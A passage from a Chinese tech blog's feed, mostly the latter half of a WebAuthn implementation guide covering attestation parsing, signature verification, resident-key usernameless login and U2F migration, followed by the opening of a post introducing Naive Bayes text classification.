一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 